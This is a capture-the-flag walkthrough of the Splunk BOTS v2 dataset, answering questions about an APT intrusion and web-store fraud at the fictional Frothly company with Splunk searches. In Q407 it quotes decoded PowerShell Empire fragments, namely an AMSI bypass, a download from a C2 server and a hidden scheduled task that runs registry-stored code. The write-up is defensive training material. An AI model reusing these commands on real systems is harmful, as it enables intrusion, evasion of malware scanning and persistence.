index=botsv2  sourcetype="stream:dns" "160.153.91.7"   "message_type{}"=RESPONSE | stats  count by name{}
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/69.png)


Answer: `hildegardsfarm.com`


### **Q404** 

What unusual file (for an American company) does winsys32.dll cause to be downloaded into the Frothly environment?


#### **Approach**

winsys32.dll is not a legitimate dll.

```
index=botsv2 "winsys32.dll"
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/70.png)


Got the process cmdline as `C:\Windows\system32\ftp.exe"  -i -s:winsys32.dll`.

ftp.exe was running winsys32.dll with -i, the interactive mode being OFF and -s:winsys32.dll, reading ftp commands from winsys32.dll. 

The attacker named their script as a fake windows dll name to make it look like a normal Windows system file.

ftp doesn't care the file extension and treats every file as a script and text file in its command. 


I needed to investigate what ftp downloaded using the commands from winsys32.dll. stream:ftp sourcetype was focused. The download or retrieve command in ftp is 'RETR'.


```index=botsv2 sourcetype="stream:ftp" RETR```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/71.png)

**Answer: 나는_데이비드를_사랑한다.hwp**


### **Q405**

What is the first and last name of the poor innocent sap who was implicated in the metadata of the file that executed PowerShell Empire on the first victim's workstation? Answer example: John Smith 


#### **Approach**


We could find this information using OSINT on `virustotal.com` or seeing the file metadata in our sandbox.


`file invoice.doc`


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/72.png)


Answer: Ryan Kovar



### **Q406** 

What is the average Shannon entropy score of the subdomain containing UDP-exfiltrated data? Answer guidance: Cut off, not rounded, to the first decimal place. Answer examples: 3.2 or 223234.9 (15 pts) 


#### **Approach**



UDP port for DNS is 53.

As there was data exfiltration. There would be many connections to the attacker's domain.

```
index=botsv2  dest_port="53" sourcetype="stream:dns" 
| stats count by dest_ip
| sort -count
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/73.png)



The two of the first four were internal IPs and the rest the google DNS ones.

`208.109.255.42` and `216.69.185.42` were suspicious as it had over 400 requests.

Tried to find their domains.

```
index=botsv2  dest_port="53" sourcetype="stream:dns"   dest_ip="208.109.255.42"
| stats count by query{}
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/74.png)


```
index=botsv2  dest_port="53" sourcetype="stream:dns"   dest_ip="216.69.185.42"
| stats count by query{}
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/75.png)

`0DsAAHNIclYsFcDN.hildegardsfarm.com` was chosen to take the one as an example. All of these sub domains have the same character count. 


See the guide for calculating Shannon entropy score at `https://www.splunk.com/en_us/blog/security/domain-parsing-url-toolbox.html` and `https://www.splunk.com/en_us/blog/security/random-words-on-entropy-and-dns.html`


You would need urltoolbox to use Shannon entropy score calculation function. 


I calculated the Shannon entropy of the subdomain and calculated the avg value based on the IPs of the attacker domains.


```
index=botsv2  dest_port="53" sourcetype="stream:dns"   (dest_ip="216.69.185.42" OR dest_ip="208.109.255.42") query{}=*
| rex field=query{} "(?<sub_domain>\w+)\.hildegardsfarm.com"
| `ut_shannon(sub_domain)`
| stats avg(ut_shannon) by dest_ip
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/76.png)


**Answer: 3.6**


### **Q407**

To maintain persistence in the Frothly network, Taedonggang APT configured several Scheduled Tasks to beacon back to their C2 server. What single webpage is most contacted by these Scheduled Tasks? Answer guidance: Remove the path and type a single value with an extension. Answer example: index.php or images.html 


#### **Approach**


I needed to find the scheduled tasks run by the APT but before that, I wanted to focus on the workstations they ran on as to narrow down the investigation.  


```
index=botsv2  sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational" "invoice.doc"
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/77.png)


One of the hosts was wrk-btun.


```
index=botsv2  sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational" "schtasks" host="wrk-btun"
| stats count by ProcessId ParentProcessId cmdline ParentCommandLine
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/78.png)

Saw the base64 encoded powershell command and decoded it in cyberchef.

The encoded powershell command spawned the scheduled task.


PowerShell's -EncodedCommand does not use plain Base64 → ASCII/UTF-8 and it uses Base64-encoded UTF-16 Little Endian (UTF-16LE).



![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/79.png)



`[ReF].AssEmBLY.GEtTyPE('System.Management.Automation.AmsiUtils')`

`AmsiUtils is the class the engine uses to talk to AMSI (Windows' Antimalware Scan Interface)`

`$_.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`


amsInitFailed was set to true making powershell assumes the AMSI engine failed to scan the blocks of scripts. This is an evasion tactic.


`$wc.HeadERs.ADd("Cookie","session=lrtRHKkA6IL5h/d8Ekk6QsxyPvk=");`

`$ser='https://45.77.65.211:443';$t='/admin/get.php';$DATA=$WC.DoWNLoaDDATA($SER+$T);`


The attacker added the cookie connecting to their server `https://45.77.65.211:443` and used https connection to encrypt their connection not to be detected easily.


The uri was '/admin/get.php' and it's child CommandLine events, `C:\Windows\system32\schtasks.exe"  /Create /F /RU system /SC DAILY /ST 10:26 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\"`, were the ones ran from the server after being connected. 


The attacker created a scheduled task called Updater daily at 10:26 to run the payloads from the registry 'HKLM:\Software\Microsoft\Network debug' for the persistence mechanism.


From this, we could conclude that the victim machine first connected to the `https://45.77.65.211:443/admin/get.php/` url, ran the payloads from the C2 connection to create the registry and run scheduled task commands creating the 'Updater' task that ran the powershell command. 

The command decoded and ran the payloads in base64 format from the registry value 'debug'.

Dived into the registry logs.


```
index=botsv2 sourcetype=WinRegistry "Software\\Microsoft\\Network"
|stats count by data
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/80.png)


Decoded the commands.

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/79.png)

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/81.png)


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/82.png)


`/login/process.php` had the two counts and the other endpoints were `/admin/get.php` and `/news.php` having one count each. 


**Answer: process.php**


### **Q408** 


The APT group Taedonggang is always building more infrastructure to attack future victims. Provide the IPV4 IP address of a Taedonggang controlled server that has a completely different first octet to other Taedonggang controlled infrastructure. Answer guidance: 4.4.4.4 has a different first octet than 8.4.4.4


#### **Approach**


Knowing the hash of ssl certificates used in their C2 servers would give the information about another controlled servers as attackers would likely use the same ssl certificate for their malware beaconing or connecting their C2. 


```
index=botsv2  sourcetype="stream:tcp" "45.77.65.211" "ssl"
| stats count by ssl_cert_md5
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/83.png)


671DFE1D4F15C5A05F21DDB66D3B7815

searched it at `https://platform.censys.io` but there was no data found for that. `platform.censysio` is a migrated one. The old data would have been lost. Google has the result for that hash.


**Answer: `104.238.159.19`**


### **Q409** 

The Taedonggang group had several issues exfiltrating data. Determine how many bytes were successfully transferred in their final, mostly successful attempt to exfiltrate files via a method using TCP, using only the data available in Splunk logs. Use 1024 for byte conversion. 


#### **Approach**

I couldn't get the exact and correct answer as the official one.

The hint told us to find this in ftp logs. ftp is for file transfer. The attacker exfiltrated the data using ftp. 


```index=botsv2  sourcetype="stream:ftp" ```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/84.png)



There's only one IP, 160.153.91.7 and its domain was `hildegardsfarm.com` as per from Q403. 

The attacker exfiltrated data to their server. That's uploading to the server. In ftp, the command is 'STOR'. 


```
index=botsv2  sourcetype="stream:ftp" "STOR" "160.153.91.7"
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/85.png)


transfer_duration field was in microseconds.

transfer_duration/1000000 x 1.24 Mbytes would needed to be multiplied to know the data size transferred for this.

transfer_duration x 1.24 x 1024 x 1024 to get the bytes. This was for one event. 

I would like to aim for the events that have the data successfully transferred.


```
index=botsv2  sourcetype="stream:ftp" "STOR" "160.153.91.7"  reply_content="*successfully transferred*"
```
![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/86.png)



There were 3 flow ids and the one had the maximum counts.

I would then have to add the results from all of these events by event flow ids.


```
index=botsv2  sourcetype="stream:ftp" "STOR" "160.153.91.7" reply_content="*(measured here)*"
| rex field=reply_content "(?<rate>[0-9]{1,4}\.[0-9]{2}) (?<size>M|K)bytes per second"
| table _time reply_content time_duration rate size
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/87.png)


1024 bytes for Kbytes or 1048576 for Mbytes


```
index=botsv2  sourcetype="stream:ftp" "STOR" "160.153.91.7" reply_content="*(measured here)*"
| rex field=reply_content "(?<rate>[0-9]{1,4}\.[0-9]{2}) (?<size>M|K)bytes per second"
| eval convertion = case(size == "M", 1048576, size == "K", 1024) 
| eval value = (transfer_duration/1000000) * rate * convertion
| stats sum(value) as total by flow_id 
| eval round_value = round(total,0)
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/88.png)



I chose the one with the flow_id with the maximum counts as the question wanted the most successfully transferred bytes.


I got '1,395,796,324' but the official answer is


**Answer: 1,394,847,505**



## **Series 5xx**


### **Q500**

Individual clicks made by a user when interacting with a website are associated with each other using session identifiers. You can find session identifiers in the stream:http sourcetype. The Frothly store website session identifier is found in one of the stream:http fields and does not change throughout the user session. What session identifier is assigned to `dberry398@mail.com` when visiting the Frothly store for the very first time? Answer guidance: Provide the value of the field, not the field name.  


#### **Approach**

The session identifier would be in cookie, data that web servers send to clients for storing related data and help websites remember who clients are and what they do. 

```
index=botsv2 sourcetype="stream:http" "dberry398@mail.com" 
| stats count by c_ip cookie
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/89.png)


The client ip was 74.130.56.117 and there was a form_key=lwh9Ql7oUbnJUqxR assigned to that user account when it had been registered. 

Checking again using its IP.


```
index=botsv2 sourcetype="stream:http" "74.130.56.117"  
| rex field=cookie "form_key=(?<session_id>\w+);" 
| stats values(session_id)
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/90.png)

The same form key was used throughout all of the interactions by that user.

**Answer: lwh9Ql7oUbnJUqxR**



### **Q501**

How many unique user ids are associated with a grand total order of $1000 or more? 


#### **Approach**


Let's check the logs related to the 'grand total' keyword.


```
index=botsv2 sourcetype="stream:http"  "grand total"
| stats count by url
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/91.png)


Let's choose the checkout url because it meant the order was completed. 


```
index=botsv2 sourcetype="stream:http" "grand_total" url="http://store.froth.ly/magento2/checkout/"  
| rex field=dest_content "USD\",\"grand_total\":\"(?<gtotal_value>\d+).\d+\"," 
| rex field=cookie "form_key=(?<session_id>\w+);"
| search gtotal_value=* OR session_id
| where gtotal_value >=1000 
| stats count by gtotal_value session_id
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/92.png)



I got the values greater than $1000 and related session_ids as the count being 8 but the question asked the unique user ids, not the session ids. 

I needed to know how many usernames were related to this and the information could be found in form_data as form_data is about posting usernames, passwords and its related cookies and ids. 

If we knew how many usernames were related to this, it's the same as knowing the unique user id count.


Using one session identifier to know the url that form_data was used for,


```
index=botsv2 sourcetype="stream:http"  "yjB8uDMr9vRpbibM" 
| stats count by url form_data
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/93.png)



`url= http://store.froth.ly/magento2/customer/account/loginPost/`

`form_data="form_key=yjB8uDMr9vRpbibM&login[username]=go@outlook.com&login[password]=BlOcKy@4!1&send="`


Let's combine all this information.

To get the 8 session_id values to use in another query.


```
index=botsv2 sourcetype="stream:http" "grand_total" url="http://store.froth.ly/magento2/checkout/"  
| rex field=dest_content "USD\",\"grand_total\":\"(?<gtotal_value>\d+).\d+\"," 
| rex field=cookie "form_key=(?<session_id>\w+);"
| search gtotal_value=* OR session_id
| where gtotal_value >=1000 
| fields session_id
| return 8 session_id
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/94.png)



```
index=botsv2 sourcetype="stream:http" url="http://store.froth.ly/magento2/customer/account/loginPost/" form_data=* (("0XnzRTpeOVy9HD1Z") OR ("0w3UxbR9QnnI5OHw") OR ("4wHUQN8O31Qt0Qth") OR ("9opxLVZ5zgicn5kx") OR ("QHHVI6brFPuLxVUk") OR ("SqxyMqO5xJVNB865") OR ("ZDd2VGcWWKcKM95o") OR ("yjB8uDMr9vRpbibM")) 
| rex field=form_data "form_key=(?<session_id>[^&]+)"   
| rex field=form_data "\[username\]=(?<name>[^&]+)"  
| stats values(name) by session_id
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/95.png)



It can be seen that the user 'friztmaytag' had the two session ids.

So, the unique user id count was 7 as there were only 7 usernames.


**Answer: 7**


### **Q502**

Which user, identified by their email address, edited their profile before placing an order over $1000 in the same clickstream? Answer guidance: Provide the user ID, not other values found from the profile edit, such as name.


#### **Approach**


The question asked the user identified by their email address meaning I had to focus on the user email thinking it as a user.


Finding the associated urls first related to changing the user information.

```
index=botsv2 sourcetype="stream:http" url="*magento2/customer/account/*" "*change*" | stats count by url
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/96.png)


Got the interesting urls and choosing the one 'edit' endpoint.


```
index=botsv2 sourcetype="stream:http"   url="http://store.froth.ly/magento2/customer/account/edit/" | rex field=cookie "form_key=(?<session_id>[^;]+);" | stats count by session_id
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/97.png)



Got the session_id as `ZDd2VGcWWKcKM95o`

Went to the another 'edit' url.


```
index=botsv2 sourcetype="stream:http"  "ZDd2VGcWWKcKM95o"  url="http://store.froth.ly/magento2/customer/account/editPost/" 
| stats count by form_data
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/98.png)



It was shown that the user tried to change their email address.

The question asked the user email as a user and the user edited their email address. 

It asked about the phase before the user changing their info and therefore, their original email address was needed to be investigated.


```
index=botsv2 sourcetype="stream:http"  "ZDd2VGcWWKcKM95o"  http_method="POST" form_data=* 
| table _time  url form_data
| sort +_time
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/99.png)



The original email was `bkildcare@yandex.com`. The user tried to change their email address after logging in. I needed to confirm the one thing that the profile was edited before placing an order over $1000 in the same clickstream. 


```
index=botsv2 sourcetype="stream:http" url="http://store.froth.ly/magento2/checkout/"  "ZDd2VGcWWKcKM95o" 
| rex field=dest_content "USD\",\"grand_total\":\"(?<gtotal_value>\d+).\d+\","  
| rex field=cookie "form_key=(?<session_id>\w+);" 
| search gtotal_value=* OR session_id 
| table _time gtotal_value session_id
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/100.png)



The user placed an order of $1152 after editing their profile by seeing the time. 


**Answer: `bkildcare@yandex.com`**


### **Q503**

What street address was used most often as the shipping address across multiple accounts, when the billing address does not match the shipping address? Answer example: 123 Sesame St


#### **Approach**


Firstly, I needed to focus on the necessary fields to see the addresses. 

The 'dest_content' field would not show the addresses returned. 

Only the http requests from clients would have the address information. 

Among all of these, src_content would have the information as it would carry the information input by clients. 

src_headers would have the header data requested by clients containing cookie information and requested url information and other related header data.


```
index=botsv2 sourcetype="stream:http" "shipping" "address"
| stats count by src_content
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/101.png)



I saw the dictionary values of address and street names. 

Finding the src_content fields


```
index=botsv2 sourcetype="stream:http" "address" (src_content="*shipping*" AND src_content="*billing*" AND src_content="*address*")  
| stats count by src_content
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/102.png)



Chose shipping-information endpoint to see the list of shipping and billing addresses


```
index=botsv2 sourcetype="stream:http"  url="http://store.froth.ly/magento2/rest/default/V1/carts/mine/shipping-information" (src_content="*shipping*" AND src_content="*billing*" AND src_content="*address*") 
| rex field=src_content "shipping_address\".+?\"street\":\[\"(?<shipping>.+?)\"\].+?billing_address\".+?\"street\":\[\"(?<billing>.+?)\"\]" 
| rex field=cookie "form_key=(?<session_id>\w+);"  
| stats  count by shipping billing
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/103.png)


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/104.png)


They all were the same.

Let's dive into other urls. 


```
index=botsv2 sourcetype="stream:http" (src_content="*shipping*" OR src_content="*billing*" OR src_content="*address*") 
| stats count by url
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/105.png)



The `magento2/rest/default/V1/carts/mine/payment-information` was targeted as I had seen the data on the `magento2/rest/default/V1/carts/mine/shipping-information` uri. 


```
index=botsv2 sourcetype="stream:http"  url="http://store.froth.ly/magento2/rest/default/V1/carts/mine/payment-information" (src_content="*shipping*" OR src_content="*billing*" OR src_content="*address*")
| rex field=src_content "street\":\[\"(?<billing_only>.+?)\"\]" 
| rex field=cookie "form_key=(?<session_id>\w+);" 
| stats count by billing_only
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/106.png)



18 unique billing addresses were got at the payment-information endpoint and 16 at the shipping-information. 

I extracted the session_id field in the queries for comparing the results using it to see the most often used address when billing and shipping addresses were not the same. 


A user could have more than one session_ids seen in Q501 and thus, I extracted usernames and session_ids from form_data to know the number of user accounts and its related ids.


```
index=botsv2 sourcetype="stream:http" url="http://store.froth.ly/magento2/customer/account/loginPost/" form_data=*
| rex field=form_data "form_key=(?<session_id>[^&]+)"   
| rex field=form_data "\[username\]=(?<name>[^&]+)"  
| stats count by session_id name
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/107.png)


Joining all three queries depending on session_id to see the most often used address when billing and shipping addresses were not the same. 


```
index=botsv2 sourcetype="stream:http" url="http://store.froth.ly/magento2/customer/account/loginPost/" form_data=* 
| rex field=form_data "form_key=(?<session_id>[^&]+)"   
| rex field=form_data "\[username\]=(?<name>[^&]+)"   
| table session_id name

| join session_id      [search index=botsv2 sourcetype="stream:http" (src_content="*shipping*" AND src_content="*billing*" AND src_content="*address*")  url="http://store.froth.ly/magento2/rest/default/V1/carts/mine/shipping-information"  
| rex field=src_content "shipping_address\".+?\"street\":\[\"(?<shipping>.+?)\"\].+?billing_address\".+?\"street\":\[\"(?<billing>.+?)\"\]"  
| rex field=cookie "form_key=(?<session_id>\w+);"   
| table session_id shipping ] 

| join session_id     [search index=botsv2 sourcetype="stream:http"   url="http://store.froth.ly/magento2/rest/default/V1/carts/mine/payment-information" (src_content="*shipping*" OR src_content="*billing*" OR src_content="*address*") 
| rex field=src_content "street\":\[\"(?<billing_only>.+?)\"\]" 
| rex field=cookie "form_key=(?<session_id>\w+);" 
| table session_id billing_only ] 

| where isnotnull(shipping) AND isnotnull(billing_only) AND shipping != billing_only 
| table name shipping billing_only
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/108.png)

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/109.png)


200 Franklin St had the most used counts as a different shipping address across different users.


**Answer: 200 Franklin St**



### **Q504**

What is the domain name used in email addresses by someone creating multiple accounts on the Frothly store website (`http://store.froth.ly`) that appear to have machine-generated usernames?


#### **Approach**

```
index=botsv2 sourcetype="stream:http" url="*http://store.froth.ly/magento2/customer/account/create*"  
| table _time url form_data
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/110.png)


There was only one username. Thus, I could not rely on the 'create' urls and `mail.com` did not give me any result other than this. 


Then, I decided to extract all the usernames from form_data to see the domain patterns. 


```
index=botsv2 sourcetype="stream:http" form_data=* url="*login*"
| rex field=form_data "\[username\]=(?<name>[^&]+)"  
| stats count by name
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/111.png)

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/112.png)


Found the machine generated usernames with `elude.in` domain by seeing its username pattern. They are were clearly shown as generated from a tool or script.

Checked the malicious domain again by using ut_shannon macro to see the entropy value of the usernames by the domain. 


```
index=botsv2 sourcetype="stream:http" form_data=* url="http://store.froth.ly/magento2/customer/account/loginPost/" 
| rex field=form_data "\[username\]=(?<name>[^@]+)@(?<domain>[^&]+)" 
|`ut_shannon(name)` 
| stats avg(ut_shannon) as entropy_val, count by domain 
| sort -entropy_val
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/113.png)



elude.in had the third most entropy value with 52 counts and the first and second had only 1 count for each.


**Answer: `elude.in`**


### **Q505**

Which user ID experienced the most logins to their account from different IP address and user agent combinations? Answer guidance: The user ID is an email address. 


#### **Approach**


Only the username having email addresses were chosen as the question wanted those. As this was related to logins, the login url was used in the search. 

As the question wanted unique IP Address and user agent counts based on the user logins, I used dc() function to get the distinct counts of the associated fields. If we want to see the field values, we can use list() function in stats command.



```
index=botsv2 sourcetype="stream:http" form_data=* url="http://store.froth.ly/magento2/customer/account/loginPost/"  
| rex field=form_data "\[username\]=(?<name>\w+?@[^&]+)"  
| stats dc(src_ip) as unique_src, dc(http_user_agent) as unique_agent, count by name 
| sort -count
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/114.png)


**Answer: `Tom2014@msn.com`**


### **Q506**

What is the most popular coupon code being used successfully on the site?


#### **Approach**


I found coupon_code in dest_content field while searching with the 'coupon' keyword. Chose status code '200' and discarded '404' to get the results that showed http request was successful.

```
index=botsv2 sourcetype="stream:http" "coupon_code" status=200  site="store.froth.ly" "payment_methods" 
| rex field=dest_content "coupon_code\":\"(?<coupon>[^\"]+)" 
| stats count by coupon
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/115.png)


We could use another method as I saw that there was 'coupons' endpoint in request after searching.

```
index=botsv2 sourcetype="stream:http" coupon 
| stats count by request
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/116.png)


```
index=botsv2 sourcetype="stream:http"  http_method=PUT request="*coupons*" 
| rex field=dest_content "message\":\"(?<message>.+?)\"" 
| where NOT message="Coupon code is not valid" 
| stats count by dest_content request status
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/117.png)


dest_content was set to 'true' when the status was successful. 

We can see the coupon code again for the successful action.


**Answer: WINTER2017**


### **Q507** 


Several user accounts sharing a common password is usually a precursor to undesirable scenario orchestrated by a fraudster. Which password is being seen most often across users logging into `http://store.froth.ly`.


#### **Approach**


Ok. The login url should be investigated first as this is about users using their passwords in form_data to log in to the website. 


```
index=botsv2 sourcetype="stream:http" form_data=* url="http://store.froth.ly/magento2/customer/account/loginPost/"  form_data=* 
| rex field=form_data "\[username\]=(?<name>[^&]+)&login\[password\]=(?<pass>[^&]+)" 
| dedup name 
| stats values(name), count by pass 
| sort -count
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/118.png)


I wanted to see how many unique users used the same password and thus, deduplicated function was used for the 'name' field and values() was used for seeing the usernames.


**Answer: HardwareBasedEasterEggs2017**



### **Q508**

Which HTML page was most clicked by users before landing on `http://store.froth.ly/magento2/checkout/` on August 19th? Answer guidance: Use earliest=1503126000 and latest=1503212400 to identify August 19th. Answer example: `http://store.froth.ly/magento2/bigbrew.html`


#### **Approach**


The question is simple. The html page before landing the link in the question meant the http referrer that redirected to the checkout endpoint.
Using the earliest and latest time in the query...



```
index=botsv2 sourcetype="stream:http"  (earliest=1503126000 AND latest=1503212400) url="http://store.froth.ly/magento2/checkout/" 
| stats count by http_referrer
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/119.png)



Choosing the most count as the question asked about the page clicked most.


**Answer: `http://store.froth.ly/magento2/mens-frothly-tee.html`**


#### **Q509**

Which HTTP user agent is associated with a fraudster who appears to be gaming the site by unsuccessfully testing multiple coupon codes? 


In Q506, we had solved the events related to coupon codes. Filtering unsuccessful attempts...


```
index=botsv2 sourcetype="stream:http"  http_method=PUT request="*coupons*"  
| rex field=dest_content "message\":\"(?<message>.+?)\""  
| where message="Coupon code is not valid"  
| stats count by http_user_agent 
| sort -count
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/120.png)


Unsuccessful testing multiple coupon codes meant the attempts with the most counts. 

**Answer: Mozilla/5.0 (Windows NT 6.333; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36**


